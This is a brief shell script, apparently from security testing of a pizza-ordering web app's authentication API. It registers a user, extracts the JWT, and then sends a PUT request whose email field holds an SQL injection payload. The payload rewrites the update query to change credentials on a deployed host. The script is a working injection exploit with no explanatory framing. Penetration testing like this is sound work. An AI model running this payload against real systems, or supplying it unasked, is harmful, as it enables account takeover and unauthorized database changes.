# host=http://localhost:3000
host=https://pizza-service.rhythum.click

response=$(curl -s -X POST $host/api/auth -d "{\"name\":\"Test\", \"email\":\"testjwt.com\", \"password\":\"test\"}" -H 'Content-Type: application/json')
# response=$(curl -s -X PUT $host/api/auth -d "{\"email\":\"d@jwt.com\", \"password\":\"diner\"}" -H 'Content-Type: application/json')
echo $response
id=$(echo $response | jq -r '.user.id')
token=$(echo $response | jq -r '.token')
curl -X PUT $host/api/auth/$id -H 'Content-Type: application/json' -d "{\"email\":\"test@jwt.com' WHERE email='test@jwt.com'; -- \", \"password\":\"newPassword\"}" -H "Authorization: Bearer $token"
